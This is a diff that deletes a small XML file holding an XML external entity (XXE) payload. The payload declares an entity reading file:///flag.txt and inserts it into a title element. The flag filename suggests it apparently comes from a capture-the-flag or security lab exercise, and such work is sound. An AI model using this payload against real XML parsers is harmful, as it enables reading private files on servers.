@@ -1,8 +1,0 @@
-<?xml version="1.0"?>
-<!DOCTYPE root [
-  <!ENTITY xxe SYSTEM "file:///flag.txt">
-]>
-<root>
-  <title>&xxe;</title>
-  <author>aaaa</author>
-</root>
